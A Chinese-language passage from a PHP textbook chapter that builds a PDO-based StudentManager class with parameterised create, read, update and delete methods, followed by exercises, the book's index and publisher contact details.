代码清单 26.22 展示了该类以及用于向 student 表插入行的 create() 方法。

## 代码清单 26.22.

```php
<?php

class StudentManager
{
    // Database connection constants
    private const DB_TECHNOLOGY = "mysql";
    private const DB_HOST = "localhost";
    private const DB_NAME = "Student";
    private const DB_USER = "testuser";
    private const DB_PASSWORD = "testuser";

// Results in DSN = "mysql:host=localhost;dbname=Student"
private const DSN = self::DB_TECHNOLOGY
    . ':host=' . self::DB_HOST
    . ';dbname=' . self::DB_NAME;

public function create($first_name, $last_name, $email)
{
    $db = new PDO(self::DSN, self::DB_USER, self::DB_PASSWORD);

    // Insert a new record
    $sql = "INSERT INTO student(`first_name`, `last_name`, `email`) VALUES (:first_name, :last_name, :email)";

    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    try
    {
        $query = $db->prepare($sql);
        $query->bindParam(":first_name", $first_name, PDO::PARAM_STR);
        $query->bindParam(":last_name", $last_name, PDO::PARAM_STR);
        $query->bindParam(":email", $email, PDO::PARAM_STR);
        $query->execute();
    } catch (Exception $ex)
    {
        echo $ex->getMessage() . "<br/>";
    }

    // Returns the primary key of this INSERT
    return $db->lastInsertId();
}
```

实例化新 PDO 对象的构造函数需要三个参数：数据源名称、用户名和密码，创建时即连接到数据库。连接到 MySQL 数据库时，数据源名称必须如下所示：

```
"mysql:host=localhost;dbname=Student"
```

第 6 至 10 行的常量将数据源名称、用户名和密码输入参数设置给 PDO 构造函数。

第 17 行是我们的 create() 方法，它接收名、姓和电子邮件地址，这三个字段对应于我们要插入 student 表的三个字段。

要使用 PDO，我们在第 19 行实例化一个新对象，该对象创建与数据库的连接。

## 26. PHP 中的面向对象编程简介

我们在第 22 行创建 SQL 语句，将数据插入 student 表。注意，我们不用 ? 并依赖它们的顺序，而是可以使用以冒号（:）开头的任意名称来创建命名参数：

```
$sql = "INSERT INTO student(`first_name`, `last_name`, `email`)
        VALUES (:first_name, :last_name, :email)";
```

这里我们使用 :first_name、:last_name 和 :email 作为命名参数，我们将传入的参数 $first_name、$last_name 和 $email 绑定到这些命名参数上。

第 25 行允许我们通过设置一些 PDO 类常量属性来启用错误报告和异常处理。这样做使我们能够使用异常来处理数据库错误，而无需太多条件逻辑的复杂性。

```
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
```

> 我还没有介绍异常处理，但简单来说，它允许我们尝试执行一些可能引发异常行为的代码（比如无法成功查询数据库表）。如果发生异常，我们可以有序地捕获它，希望这能让我们的应用程序优雅地恢复。如果一切在 try 块中都正常运行，则不会执行 catch 块。

面向对象方式的参数准备和绑定在 try 块的这些代码行中处理：

```
$query = $db->prepare($sql);
$query->bindParam(":first_name", $first_name, PDO::PARAM_STR);
$query->bindParam(":last_name", $last_name, PDO::PARAM_STR);
$query->bindParam(":email", $email, PDO::PARAM_STR);
```

首先，我们调用 PDO 对象的 prepare() 方法，将 SQL 语句作为参数传入，该方法返回一个 PDOStatement 对象，我们将其赋值给一个名为 $query 的变量。这是我们绑定参数的对象。注意，bindParam() 方法的第三个参数是指定数据类型的 PDO 类常量。虽然这个参数是可选的，但你应该显式包含它，以便 PDO 正确转义你的数据类型。

然后我们通过以下调用执行查询：

```
$query->execute();
```



## 使用 OOP 创建参数化查询

如果 SQL 语句格式错误，就会抛出异常。然后，错误会在第 36 行通过调用传入 catch 块的异常对象的 getMessage() 方法输出：

```php
catch(Exception $ex)
{
    echo $ex->getMessage() . "<br/>";
}
```

如果一切按计划进行，我们可以通过调用 PDO 对象的 lastInsertId() 方法，将新插入到 student 表中的行的主键返回给调用者：

```php
return $db->lastInsertId(); // Returns the primary key of this INSERT
```

清单 26.23 是一个使用该方法的示例，它使用一个预先填充的、由关联数组组成的数组来创建多个条目。

### 清单 26.23.

```php
1. <?php
2. require_once('StudentManager.php');
3. 
4. // Manage some Simpsons
5. $simpsons_manager = new StudentManager();
6. 
7. $simpsons = [];
8. 
9. $simpsons[] = [
10.     'first_name' => 'Bart',
11.     'last_name' => 'Simpson',
12.     'email' => 'kowabungadude@simpsons.com'
13. ];
14. 
15. $simpsons[] = [
16.     'first_name' => 'Lisa',
17.     'last_name' => 'Simpson',
18.     'email' => 'lisa@simpsons.com'
19. ];
20. 
21. $simpsons[] = [
22.     'first_name' => 'Marge',
23.     'last_name' => 'Simpson',
24.     'email' => 'marge@simpsons.com'
25. ];
26. 
27. $simpsons[] = [
28.     'first_name' => 'Homer',
29.     'last_name' => 'Simpson',
30.     'email' => 'ilovedonuts@simpsons.com'
31. ];
32. 
33. // Insert each Simpson into the students table
34. foreach ($simpsons as $simpson)
35. {
36.     echo "Creating a new entry for: "
37.         . $simpson['first_name'] . " " . $simpson['last_name']
38.         . " with email of: " . $simpson['email'] . "<br/>";
39. 
40.     $id = $simpsons_manager->create(
41.         $simpson['first_name'], $simpson['last_name'], $simpson['email']
42.     );
43. 
44.     echo $simpson['first_name'] . "'s id is: $id<br/><br/>";
45. }
```

这段代码产生的输出如图 26.6 所示。图 26.7 显示了 student 表中的条目。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_498_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_498_1.png)

## 使用 PDO 读取数据库条目

从数据库表读取条目时，我们要么读取单行，要么读取多行。我将使用两种不同的方法演示如何读取所有行和单行。

首先，让我们创建一个 readAll() 方法，返回 student 表中的所有行。清单 26.24 是 readAll() 方法：

### 清单 26.24.

```php
 1. public function readAll()
 2. {
 3.     $db = new PDO(self::DSN, self::DB_USER, self::DB_PASSWORD);
 4. 
 5.     // Read all records
 6.     $sql = "SELECT * FROM student";
 7. 
 8.     try
 9.     {
10.         $query = $db->prepare($sql);
11.         $query->execute();
12. 
13.         // Gets a numeric array of the query results with each element
14.         // set to a Student object containing the row's fields
15.         $results = $query->fetchAll(PDO::FETCH_CLASS, "Student");
16.     }
17.     catch(Exception $ex)
18.     {
19.         echo "{$ex->getMessage()}<br/>";
20.     }
21. 
22.     return $results;
23. }
```

因为不需要向 readAll() 方法传递任何参数，所以不需要进行参数化。除第 15 行外，此方法不言自明：

```php
$results = $query->fetchAll(PDO::FETCH_CLASS, "Student");
```

fetchAll() 方法对于如何从查询中返回结果有很多选项，但我的首选是能够返回一个行集，其中每一行都表示在一个对象中。请注意，第二个参数需要一个字符串，你应该将其设置为类名。该类名用于为查询返回的每一行实例化一个对象。唯一需要注意的是，该类必须定义与表的字段名完全匹配的属性。

因此，我们还需要创建一个 Student 类，其中包含 student 表中所有字段的属性，并将它们包含在我们的 StudentManager 类文件中。清单 26.25 是 Student 类。

### 清单 26.25.

```php
 1. <?php
 2. 
 3. class Student
 4. {
 5. 
 6.   private $id;
 7.   private $first_name;
 8.   private $last_name;
 9.   private $email;
10. 
11. // Getters/Setters
12. public function getId()
13. {
14.   return $this->id;
15. }
16. public function getFirstName()
17. {
18.     return $this->first_name;
19. }
20. 
21. public function getLastName()
22. {
23.     return $this->last_name;
24. }
25. 
26. public function getEmail()
27. {
28.     return $this->email;
29. }
30. }
```

请注意，第 5-8 行包含与 student 表中字段名完全相同的属性。这是 PHP 中的一个便捷特性，可以加快为数据库表创建 CRUD 包装器，让我们可以在应用中轻松使用。

Student 类的其余部分包含用于访问所有属性的 getter 方法。如果我们愿意，可以创建 set*() 方法，在调用时更新数据库表。这个就留作练习给你了。

清单 26.26 是一个如何使用 readAll() 方法的示例，其输出如图 26.8 所示。现在让我们创建一个 readById() 方法，该方法将要读取的 student 表中行的 id 作为参数。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_500_0.png)

### 清单 26.26.

```php
 1. <?php
 2. 
 3. require_once('StudentManager.php');
 4. 
 5. // Manage some Simpsons
 6. $simpsons_manager = new StudentManager();
 7. 
 8. $the_simpsons = $simpsons_manager->readAll();
 9. 
10. foreach ($the_simpsons as $simpson)
11. {
12.     echo "First name: " . $simpson->getFirstName() . "<br/>";
13.     echo "Last name: " . $simpson->getLastName() . "<br/>";
14.     echo "Email: " . $simpson->getEmail() . "<br/>";
15.     echo "<br/>";
16. }
```

让我们看看清单 26.27，它用于根据 ID 读取单行。

### 清单 26.27.

```php
 1. public function readById($id)
 2. {
 3.     $db = new PDO(self::DSN, self::DB_USER, self::DB_PASSWORD);
 4. 
 5.     // Read the record given by the id
 6.     $sql = "SELECT * FROM student WHERE id=:id";
 7. 
 8.     try
 9.     {
10.         $query = $db->prepare($sql);
11.         $query->bindParam(":id", $id, PDO::PARAM_INT);
12.         $query->execute();
13. 
14.         // Fetch result into instance of a Student object
15.         $result = $query->fetchObject("Student");
16.     }
17.     catch(Exception $ex)
18.     {
19.         echo "{$ex->getMessage()}<br/>";
20.     }
21. 
22.     return $result;
23. }
```

除了第 15 行之外，此方法中的一切应该都很简单：

```php
$result = $query->fetchObject("Student");
```

> 另一种指定类的方式是使用 Student::class——不带引号。PHP 使用 ::class 常量来引用类的全限定名，其中包含其命名空间。
>
> ```php
> $result = $query->fetchObject(Student::class);
> ```

在我们的 readAll() 方法中，我们使用了 fetchAll() 方法，它返回一个 Student 对象数组。我们本可以在第 15 行做同样的事情，但那样会在一个只有一个元素的数组中返回单个对象。既然我们知道只需要查找一行，返回单个对象会更方便。因此，我们需要使用 fetchObject() 方法，它接受一个字符串，其中包含我们想要使用的类名，该类名包含 student 表中所有字段的属性，在我们的例子中就是 Student。

如果传入的 ID 在 student 表中不存在，readById() 将返回 false。

### 清单 26.28.

```php
1. require_once('StudentManager.php');
2. 
3. // Manage some Simpsons
4. $simpsons_manager = new StudentManager();
5. 
6. $a_simpson = $simpsons_manager->readById(3);
7. 
8. if ($a_simpson)
9. {
10.     echo "First name: " . $a_simpson->getFirstName() . "<br/>";
11.     echo "Last name: " . $a_simpson->getLastName() . "<br/>";
12.     echo "Email: " . $a_simpson->getEmail() . "<br/>";
13.     echo "<br/>";
14. }
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_502_0.png)

## 使用 PDO 更新数据库条目

现在我们将创建一个名为 update() 的方法，用于更新 student 表中的一行。请参见清单 26.29。

### 清单 26.29.

```php
1. public function update($id, $first_name, $last_name, $email)
2. {
3.   $db = new PDO(self::DSN, self::DB_USER, self::DB_PASSWORD);
4. 
5.   // UPDATE a record with a given first name, last name, and email for a given id
6.   $sql = "UPDATE student SET `first_name`=:first_name, `last_name`=:last_name, "
7.     . " `email`=:email WHERE id=:id";
8. 
9.   $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
10. 
11.   try
12.   {
13.     $query = $db->prepare($sql);
14.     $query->bindParam(":id", $id, PDO::PARAM_INT);
15.     $query->bindParam(":first_name", $first_name, PDO::PARAM_STR);
16.     $query->bindParam(":last_name", $last_name, PDO::PARAM_STR);
17.     $query->bindParam(":email", $email, PDO::PARAM_STR);
18.     $query->execute();
19.     $rows_affected = $query->rowCount();
20.   }
}
```


```
21. catch(Exception $ex)
22. {
23.     echo $ex->getMessage() . "<br/>";
24. }
25.
26. return $rows_affected; // Returns the number of rows affected by the UPDATE
27. }
```

我们显然需要参数化每个传入的参数，我们在第 6、7 行以及第 14–17 行完成了这一点。唯一需要解释的其他行是第 19 行：

```
$rows_affected = $query->rowCount();
```

由于我们只在 student 表中更新单行，rowCount() 在行成功更新时返回 1。如果未找到 ID，则返回 0。我们将此值返回给 update() 的调用者，以便他们知道更新是否成功。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_503_0.png)

清单 26.30 是我们如何使用 update() 方法的示例。运行它会产生图 26.10 所示的输出。

### Listing 26.30.

```
1. require_once('StudentManager.php');
2.
3. // Manage some Simpsons
4. $simpsons_manager = new StudentManager();
5.
6. $update_homer_to_maggie = $simpsons_manager->readById(4);
7.
8. if ($update_homer_to_maggie)
9. {
10.    echo "First name: " . $update_homer_to_maggie->getFirstName() . "<br/>";
11.    echo "Last name: " . $update_homer_to_maggie->getLastName() . "<br/>";
12.    echo "Email: " . $update_homer_to_maggie->getEmail() . "<br/>";
13.    echo "<br/>";
14. }
15.
16. if ($simpsons_manager->update(4,"Maggie", "Simpson", "maggie@simpsons.com") == 1)
17. {
18.    $update_homer_to_maggie = $simpsons_manager->readById(4);
19.
```

## 26. PHP 面向对象编程简介

```
20. if ($update_homer_to_maggie)
21. {
22.     echo "First name: " . $update_homer_to_maggie->getFirstName() . "<br/>";
23.     echo "Last name: " . $update_homer_to_maggie->getLastName() . "<br/>";
24.     echo "Email: " . $update_homer_to_maggie->getEmail() . "<br/>";
25.     echo "<br/>";
26. }
27. }
```

## 使用 PDO 删除数据库条目

最后，让我们看看 delete() 方法应该是什么样子。参见清单 26.31。

### Listing 26.31.

```
1. public function delete($id)
2. {
3.     $db = new PDO(self::DSN, self::DB_USER, self::DB_PASSWORD);
4. 
5.     // Delete a record
6.     $sql = "DELETE FROM student WHERE id=:id";
7. 
8.     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
9. 
10. try
11. {
12.     $query = $db->prepare($sql);
13.     $query->bindParam(":id", $id, PDO::PARAM_INT);
14.     $query->execute();
15.     $rows_affected = $query->rowCount();
16. }
17. catch(Exception $ex)
18. {
19.     echo $ex->getMessage() . "<br/>";
20. }
21. 
22. return $rows_affected; // Returns the number of rows affected by the DELETE
23. }
```

由于我们需要将 id 作为参数传递给 delete()，我们需要像第 6 行和第 13 行所示那样对其进行参数化。正如我们在 update() 方法中所做的那样，我们将返回 DELETE 影响的行数。

您可以在清单 26.32 中看到我们如何使用 delete() 方法的示例。调用此方法会生成图 26.11 中的输出。

### Listing 26.32.

```
```php
1. require_once('StudentManager.php');
2.
3. // Manage some Simpsons
4. $simpsons_manager = new StudentManager();
5.
6. $bart = $simpsons_manager->readById(1);
7.
8. if ($bart)
9. {
10.    echo "Deleting " . $bart->getFirstName() . " " . $bart->getLastName() . "<br/>";
11.
12. if ($simpsons_manager->delete($bart->getId()) == 1)
13. {
14.    echo "Successfully deleted " . $bart->getFirstName() . " "
15.       . $bart->getLastName() . "<br/>";
16. }
17. }
```
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_505_0.png)

## 练习

- 1. 使用面向对象编程重写 Bad Libs
- 1. 创建一个名为 BadLibs 的类并将其保存在名为 MadLibs.php 的 PHP 脚本中。
- 2. 创建属性用于保存名词、动词、形容词、副词和故事
- 3. 为所有属性创建 getter 和 setter
- 4. 创建一个方法用于将新属性插入到你的 mad libs 数据库表中
- 5. 创建一个查询故事的方法，该方法返回按从新到旧排序的结果集。
- 6. 创建一个方法，该方法将结果集（来自查询）作为参数并以格式化的 HTML 表格形式返回结果
- 7. 你可以使用现有的 Bad Libs 数据库或创建一个新的数据库。

## 26. PHP 面向对象编程简介

- 2. 使用 PDO 创建一个 ToDo List 应用程序
- 1. 创建一个名为 ToDo 的数据库。
- 2. 创建一个名为 todo 的表，其中包含 id、description 字段。使 id 为主键，description 应为 varchar[100]。
- 3. 使用 PDO 为 todo 表创建一个 CRUD 类
- 4. 创建一个 ToDo 列表应用程序，其中包含一个表单，允许用户创建、读取所有、按 id 读取、更新和删除 ToDo 列表项
- 5. 当用户读取所有 ToDo 项时，将结果显示在包含 id 的表格中。
- 6. 当用户更新 ToDo 列表项时，返回 1 表示有一行受影响且更新成功，或在不成功时返回 0。
- 7. 当用户删除 ToDo 列表项时，返回 1 表示有一行受影响且更新成功，或在不成功时返回 0。

## 索引

- **A**
- 
- 访问
- 
- 凭据, 282
- 
- 修饰符, 452, 454, 473
- 
- 权限, 324–25, 327, 353, 400–401, 403
- 
- **adminer**, 12–14, 98, 112, 136–37, 139, 155, 217, 325, 380, 397
- 
- **算法**, 304, 325
- 
- 密码哈希, 304–5
- 
- 算法，加密, 306
- 
- **Apache**, 9–10, 12, 219, 223, 302
- 
- apt install, 9
- 
- 重启, 12
- 
- **API**, 30, 315, 474
- 
- 外部, 88
- 
- 不安全 JavaScript, 315
- 
- **应用程序安全风险 (ASR)**, 302, 306, 315
- 
- **数组**, 27–30, 43–52, 54, 69–70, 75, 77–78, 92, 119–20, 150–51, 161, 198, 203, 228, 348–49, 413–14, 425–27, 430–31, 481
- 
- 关联, 27–28, 45, 53–54, 77, 91, 94, 119, 477
- 
- 空, 27, 44, 295
- 
- 函数, 46–47, 49, 51
- 
- 索引, 44
- 
- 多维, 52–53
- 
- 数字, 44–45, 479
- 
- 简写语法, 28, 44–46
- 
- 超全局, 161, 178, 180, 182, 184–85, 192, 202, 205, 271
- 
- 攻击, 306, 315–16, 319
- 
- 冲突, 302
- 
- 目录路径遍历, 319
- 
- 中间人, 321
- 
- **身份验证**, 277–80, 282–84, 352
- 
- 基本, 278–79
- 
- 头部, 281, 283, 352
- 
- **B**
- 
- Bash, 98–101, 106
- 
- Bootstrap, 141–42, 149, 160, 164, 178, 183
- 
- 卡片, 159, 178
- 
- 客户端验证, 164, 203, 291, 328, 343
- 
- **C**
- 
- 可调用, 30, 69
- 
- Canonical, 6
- 
- CAPTCHAs, 326
- 
- 字符
- 
- 特殊, 19, 24
- 
- 字符串转义, 35
- 
- 类
- 
- 基类, 465–68
- 
- 常量, 461, 481
- 
- 定义, 29, 453
- 
- 设计, 453–54
- 
- 实例化, 458
- 
- 名称, 24
- 
- 命名, 453
- 
- CLI（命令行界面）, 13, 98, 106
- 
- **代码**
- 
- 条件, 127, 160
- 
- 遗留, 109
- 
- 过程式, 313
- 
- 易受攻击, 317
- 
- **拼接**, 34, 36, 305, 474
- 
- **条件**, 55–64, 74, 184–86, 205–6, 208, 225–26, 230–31, 237, 330–31, 334–36, 344–47, 366, 371, 383–84, 387–89, 409–10, 423–24, 426–28, 437–38, 440–42
- 
- 兜底, 410, 424, 438
- 
- elseif, 225, 344
- 
- 三元, 366, 372
- 
- **条件逻辑**, 56, 59, 93, 288, 313, 330, 476
- 
- 条件语句, 59–62, 281
- 
- 复合, 62–64
- 
- **常量**, 25, 31, 85–86, 142, 223, 225, 229, 461, 475
- 
- 全局, 85
- 
- 引用, 461
- 
- **构造函数**, 452, 455, 469–73, 475
- 
- 子, 472
- 
- 默认, 459, 469
- 
- **cookies**, 184, 286–92, 295–300, 314, 459
- 
- 引用, 296
- 
- 已保存, 288, 290, 292
- 
- 值, 288
- 
- CrackStation, 303–4



## D
- 数据
  - 持久化, 300
  - 不受信任的, 315
  - 用户提供的, 314–15, 322
- 数据库, 13–14, 77–78, 98, 101–2, 105–6, 108–14, 129–31, 134–37, 143–44, 166–68, 174, 192–94, 216–17, 234–35, 259–62, 300, 305–7, 309–10, 390–92, 474–75
  - 代码, 235, 261
  - 连接, 109–10, 333, 337
  - 查询错误, 77, 111, 119–20, 127, 129
  - 错误, 333, 476
  - northwind, 99–100, 102
  - 查询, 118, 146, 316, 332–33, 337, 473
  - 表, 199, 300, 314–15, 324–25, 380, 449–50, 474, 476, 478, 480
  - 用户账户, 13
- 数据类型, 25, 27, 57, 102, 333, 476
  - 布尔, 26, 68
  - 复杂, 458
  - 复合, 27
  - 浮点, 26
  - 整数, 26, 68
  - 特殊, 30
  - 字符串, 27, 68–69, 332, 337
- 日期, 3, 18–19, 286, 302, 325, 449
- 调试, 6, 61, 85, 89
- 析构函数, 472
- 目录
  - 当前, 90
  - 下载, 13
  - 遍历攻击, 318
- 文档块, 224, 332

## E
- 电子邮件, 19, 318, 470–72, 475–78, 480, 482
- 电子邮件地址, 318, 474–75
- 错误
  - 代码, 222, 332
  - 连接, 114
  - 致命, 467
  - 最后, 333, 337
  - 消息, 109, 114, 124, 224–27, 232, 235, 237–38, 261, 412
  - 输出, 113
- 错误条件, 225, 237–38
- 错误处理器, 自定义, 109
- 异常, 358, 452, 475–77, 479, 482, 484
  - 处理, 476

## F
- 文件
  - 可执行, 222, 320
  - 字段, 218, 248–49, 252, 259, 262, 270–71, 381
  - php.ini, 4, 11
  - 上传, 319–20
  - 上传, 146, 222–23, 228, 258, 319
- 表单
  - 登录, 318, 341
  - 简单, 90
  - 已提交, 93
- 函数, 30–31, 81–88, 108–10, 165, 203–4, 223–25, 229–32, 234–35, 247, 268, 293–95, 299, 305–6, 311–12, 329–30, 332–35, 340, 342–43, 350–51, 398–99
  - 匿名, 205
  - 调用, 29
  - 头部, 332–33
  - 作用域运算符, 86
  - 签名, 86, 333

## G
- 获取器, 454–56, 458–59, 462, 465, 470–71, 485
  - 访问器方法, 454

## H
- 哈希, 302–6, 310, 325, 336, 338–39, 346, 348–49
  - 加盐, 305
  - 唯一, 304–5

## I
- IDEs（集成开发环境）, 112, 333
- 不可变性, 454
- 继承, 452, 465, 467–68
- 整数, 25–26, 28, 41, 44, 68–70, 333, 458
- 集成开发环境。参见 IDEs

## J
- Java, 25, 323, 456–57
- JavaScript, 165, 173, 204, 212, 293, 298, 315–16, 321, 340, 343, 350
  - 代码, 164, 205, 317
  - 函数, 291, 330, 343

## L
- LastPass, 304
- 登录
  - 单个, 324
  - 页面, 336, 339, 341–42, 352, 355, 365–68
  - 脚本, 336, 341–45, 347, 349, 353, 365
- 循环, 73–79, 86, 119–20, 212, 216, 247, 249, 293, 299, 340, 343, 350
  - foreach, 75, 78–79, 203
  - 哨兵, 74, 76–77

## M
- md5, 303–4
- 取模, 39–42
  - 运算符, 41
- MySQL
  - 数据库, 76–77, 97–120, 309, 475
  - 文档, 99
  - northwind.sql, 101
  - 服务器, 98, 109, 111, 119–20, 151, 180–81, 194–95, 311–13, 335, 346, 394–95, 398–99, 429–30, 441–42, 444–46
  - 服务器和客户端, 10
- MySQL CLI, 14, 98–107, 112, 118, 135

## N
- Northwind SQL 文件, 77, 99–102

## O
- 面向对象编程。参见 OOP
- 对象, 27, 29, 38–39, 69, 71, 453–56, 458–59, 467, 469–71, 476, 479
  - 数据库结果, 333, 337
  - 不可变, 455
- OOP（面向对象编程）, 29, 82, 451–86
- 开放式 Web 应用安全项目[1]。参见 OWASP
- 运算符, 28, 34, 37–42, 45, 57
  - 算术, 39–41
  - 赋值, 38
  - 比较, 56–57
  - 逻辑, 61–63
  - 优先级, 39–40, 62
  - 火箭, 45
  - 作用域解析, 461
  - 作用域, 86–87
  - 三元, 60, 202–3, 361
- OWASP（开放式 Web 应用安全项目[1]）, 302, 315, 319, 322
- OWASP，备忘单系列, 302
- OWASP，十大, 302, 306, 315

## P
- paamayim-nekudotayim, 461
- 参数, 68, 82–84, 86–87, 110, 224, 332–34, 337, 398–99, 470, 475–76, 479–80, 484
  - 默认, 318
  - 隐藏表单, 408
  - 入站, 476, 483
  - 恶意, 186, 208
  - 命名, 476
- 密码
  - 字段, 331, 345
  - 哈希, 303
  - 哈希值, 304
  - 加盐, 304–5
  - 安全用户, 302
  - 有效, 328, 339, 342, 350
- PDO（PHP 数据对象）, 108, 452, 473–76, 478–79, 481–82, 484
- PHP 数据对象。参见 PDO
- phpinfo, 4, 20
- php.ini
  - 配置, 223
  - 指令, 4
- POST
  - 表单变量, 237
  - 请求, 164, 184, 223
- 优先级, 39, 62
- 属性, 25, 46, 452–56, 458–59, 470, 473, 479–81, 485
  - 类实例, 472
  - 对象的, 469
  - 父级, 465

## Q
- 查询参数, 145–47, 150–51, 176–78, 180, 182, 192, 196, 205, 207, 313–14, 318, 332–33, 337
  - 发送, 146
- 查询字符串, 110, 115, 118–19, 143, 186, 206, 208, 332–33, 337

## R
- 可读性, 62, 82, 91
  - 高, 85

## S
- 安全, 4, 12, 115, 158, 176, 192, 222, 278, 286, 291
  - 风险, 299, 302, 306
  - 网站, 322
- 安全风险，顶级应用, 302
- 会话, 294–300, 321, 341–42, 344–45, 348–51, 353–54, 358–59, 366–68, 371, 374, 377, 396, 404–7, 413–14, 416, 419–20, 422–31, 433–39, 441–42, 444–47
  - 浏览器, 286–87
  - cookie, 299, 321
  - 当前, 295–99
  - ID, 299–300, 314, 321
  - 安全, 321
  - 变量, 286, 293–300, 314, 344, 351, 358, 366, 414
- 会话变量
  - 访问, 294–95
  - 创建, 342
  - 已保存, 296, 298
- SQL（标准查询语言）, 98–99, 110, 118, 241, 309, 385
- SQL
  - 命令, 98, 102, 106–7, 312
  - 注入, 115, 306–13, 473
  - 查询, 199, 306–7, 312, 332–33, 337
    - UPDATE 查询, 206
- 标准查询语言。参见 SQL
- 超全局, 93–94, 150, 281, 287, 294–95, 297
  - COOKIE, 290
  - POST, 92, 260, 331, 345
  - SESSION, 294
- 超级用户, 7–10, 13, 15

## T
- 三元操作, 60, 420
- 类型，浮点, 26, 68–69

## U
- Ubuntu, 6, 8, 10–11, 16
  - LTS 版本, 99
- Unix, 6–7, 101
- UNIX，时间戳, 287
- url, 2, 93, 146, 150–51, 314, 348–49, 351
  - 当前网页, 93
  - 目标, 185
- 用户登录, 134, 158, 176, 192, 325
  - 单个, 324, 356

## V
- 验证, 124–25, 128, 164–66, 173, 203–4, 293, 299, 328–29, 340, 343, 350
  - 添加, 131
  - 客户端, 164
  - 错误, 160, 165
- 变量, 24–25, 27, 29–31, 34, 38–39, 60–61, 66, 69, 71, 74–75, 83–86, 202, 205, 332–33, 456–57
  - 布尔, 125, 165, 330
  - cookie 和会话, 286, 299
  - 创建, 25
  - 全局, 85
  - 局部, 83, 91–92, 457
  - 名称, 19, 24–25, 28, 44–45, 75, 453
  - 作用域, 85–86
  - 超全局, 145, 150, 195–96, 205, 222, 225, 259, 280

## W
- web 服务器, 2–4, 6, 94, 219, 221–22, 229–31, 319–21

## X
- XSS, 315–16, 318, 321
  - 攻击, 315–16, 318

## 26. 索引
- **PHP 中的函数式编程，第二版**
  作者：Simon Holywell
  ISBN：978-1940111469
- **Web 安全 2016**
  编辑：Oscar Merida
  ISBN：978-1940111414
- **使用 OAuth 和 PHP 集成 Web 服务**
  作者：Matthew Frost
  ISBN：978-1940111261
- **Zend Framework 1 到 2 迁移指南**
  作者：Bart McLeod
  ISBN：978-1940111216
- **使用 PHP 进行 XML 解析**
  作者：John M. Stokes
  ISBN：978-1940111162
- **Zend PHP 5 认证学习指南，第三版**
  作者：Davey Shafik with Ben Ramsey
  ISBN：978-1940111100
- **掌握 SPL 库**
  作者：Joshua Thijssen
  ISBN：978-1940111001

## 反馈和更新

请告诉我们您对这本书的看法！您喜欢什么？什么令人困惑或可以改进？您是否发现了勘误？您对这本书的任何反馈和想法都将帮助我们改进下一版。

## 联系作者

Ken Marks 在 twitter 上，@FlibertiGiblets，可通过电子邮件 KennethEMarks@gmail.com 联系。他乐于收到关于材料的反馈，并听取这本书如何帮助您学习 Web 开发。

## 出版社说明

为了保持联系并获知本书的未来版本通知，请访问 http://phparch.com 并订阅我们的（低流量）邮件列表。

您也可以在 twitter 上关注我们，@phparch，以及在 facebook 上关注 https://facebook.com/phparch/
